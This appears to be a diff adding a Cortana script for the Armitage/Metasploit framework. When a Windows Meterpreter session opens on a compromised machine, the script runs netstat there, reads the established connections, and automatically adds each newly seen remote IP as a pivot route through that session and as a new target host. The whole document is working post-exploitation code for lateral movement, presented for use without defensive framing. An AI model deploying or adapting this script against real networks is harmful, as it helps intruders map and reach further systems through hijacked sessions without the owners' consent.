@@ -1,0 +1,42 @@
+# Cortana script to discover strange new networks.
+# by monstream00
+
+# Step 1. When a session opens, grab its routes.
+on session_sync {
+	if (-iswinmeterpreter $1) {
+		m_exec($1, "netstat -na");
+	}
+}
+
+# netstat -na | findstr EST
+on exec_netstat {
+	$verifyState = "ESTABLISHED";
+	$netMask = "255.255.255.255";
+	@netstatStuff = parse_table($3, @("Proto", "Local Address", "Foreign Address", "State"));
+	foreach $netstatStuff (@netstatStuff) {
+		($junk_proto, $junk_localIP, $NewNetIPandPort, $session_state) = values($netstatStuff, @('Proto', 'Local Address', 'Foreign Address', 'State'));
+		if ($session_state eq $verifyState) {
+			($NewNetIP, $junkPort) = split(':', $NewNetIPandPort);
+			$console = console();
+			@datatemp = hosts();
+			foreach $datatemp (@datatemp) {
+				@CurrentHostList[$counterw] = $datatemp;
+				$counterw += 1;
+			}
+			sub criteria { 
+				$tempCheck = $1;
+				return iff($tempCheck eq $NewNetIP, "match", $null); 
+			} 
+			$answer1 = search(@CurrentHostList, &criteria); 
+			if ($answer1 is $null) {
+				println("[*] Discovered Host Route and Added: $NewNetIP");
+				route_add($NewNetIP, $netMask, $1);
+				cmd($console, "hosts --add $NewNetIP");	
+				sleep(5 * 1000);
+				db_sync();
+			}		
+		}
+	}
+}
+
+
